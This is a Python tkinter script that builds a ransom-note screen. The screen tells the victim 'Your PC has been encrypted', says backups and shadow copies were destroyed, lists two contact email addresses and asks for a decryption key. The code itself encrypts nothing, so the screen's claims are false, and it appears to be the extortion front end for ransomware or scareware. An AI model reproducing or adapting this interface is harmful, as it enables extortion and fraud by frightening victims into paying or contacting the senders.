import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk 


def on_enter():
    description = description_var.get("1.0", tk.END).strip()  # Get text from Text widget
    messagebox.showinfo("Description Entered", f"You entered: {description}")

def show_context_menu(event):
    context_menu.post(event.x_root, event.y_root)

def copy_text():
    root.clipboard_clear()  # Clear the clipboard
    root.clipboard_append(description_var.get("1.0", tk.END))  # Copy text from the Text widget


def cut_text():
    copy_text()  # Copy the text first
    description_var.delete("1.0", tk.END)  # Then delete it from the Text widget

def paste_text():
    try:
        text = root.clipboard_get()  # Get text from clipboard
        description_var.insert(tk.END, text)  # Insert it into the Text widget
    except tk.TclError:
        pass  # Handle case where clipboard is empty

# Create the main window
root = tk.Tk()
root.title("Description Input GUI")
root.geometry("1080x900")  # Set the width to 800px and height to 600px
root.configure(bg='white')  # Set the background color to blue

# Load an image
image = Image.open("output.jpg") 
image = image.resize((200, 200), Image.LANCZOS)  # Resize the image
photo = ImageTk.PhotoImage(image)

# Create a label to display the image
image_label = tk.Label(root, image=photo, bg='blue')  # Set background color for the label
image_label.pack(pady=10)

# Create a label for the warning text
warning_label = tk.Label(root, 
                        text="Your PC has been encrypted: ", 
                        font=("Arial", 16), fg='black', bg='white')
warning_label.pack(pady=5)

# Adding another description
warning_label = tk.Label(root,
                         text="""All your files have been encrypted with military-grade encryption. 
                         \n Backups were either encrypted or deleted or backup disk were formatted.
                         """,
                         font=("Arial", 16), fg='black', bg='white')
warning_label.pack(pady=3)

# 
warning_label = tk.Label(root, 
                        text="""Shadow copies also removed, so f8 or any other methods may damage the encrypted data but not recover it.
                        """,
                        font=("Arial", 16), fg='black', bg='white')
warning_label.pack(pady=3)


# 
# Create a Text widget for the email addresses
email_text = tk.Text(root, height=3, width=80, bg='white', fg='black', wrap=tk.WORD, font=("Arial", 12, "bold")) 
email_text.insert(tk.END, "To info (decrypt your files) get in touch with us at: cmbonu@ymail.com or cboy.chinedu@gmail.com for the next instructions.")
email_text.pack(pady=10, padx=10)
email_text.config(state=tk.DISABLED)

# Create a Text widget for input
description_var = tk.Text(root, height=5, width=50, bg='white', fg='black')  # Set background and foreground colors
description_var.pack(pady=10)

# Create a label to display text under the input box
label = tk.Label(root, text="Please enter or paste your decryption key and click 'Enter'.", fg='black', bg='white')
label.pack(pady=5)

# Create a bigger 'Enter' button
enter_button = tk.Button(root, text="Decrypt Files", command=on_enter, width=20, height=3, bg='white', fg='black')
enter_button.pack(pady=10)

# Create a context menu for the Text widget
context_menu = tk.Menu(root, tearoff=0)
context_menu.add_command(label="Copy", command=copy_text)
context_menu.add_command(label="Cut", command=cut_text)
context_menu.add_command(label="Paste", command=paste_text)

# Bind the right-click event to show the context menu for the Text widget
description_var.bind("<Button-3>", show_context_menu)

# Run the application
root.mainloop()
